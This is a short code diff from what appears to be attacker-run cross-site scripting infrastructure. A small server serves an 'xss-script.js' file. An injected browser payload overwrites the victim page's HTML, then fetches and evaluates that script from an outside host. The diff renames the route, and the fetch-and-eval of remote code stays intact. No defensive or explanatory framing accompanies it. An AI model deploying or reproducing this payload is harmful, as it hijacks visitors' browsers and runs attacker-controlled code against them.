@@ -22,7 +22,7 @@ serve({
       });
     }
 
-    if (url.pathname === "/xss-script.js" && req.method === "GET") {
+    if (url.pathname === "/xss-script" && req.method === "GET") {
       const jsCode = fs.readFileSync("xss-script.js", "utf-8");
       return new Response(jsCode, {
         headers: {
@@ -44,7 +44,7 @@ console.log('Fetched HTML:', d);
 document.documentElement.innerHTML = d;
 console.log('Document HTML replaced');
 // Fetch and eval xss-script.js
-fetch('https://data.estebanmf.space/xss-script.js')
+fetch('https://data.estebanmf.space/xss-script')
 .then(t => t.text())
 .then(script => {
 console.log('xss-script.js fetched, evaluating');
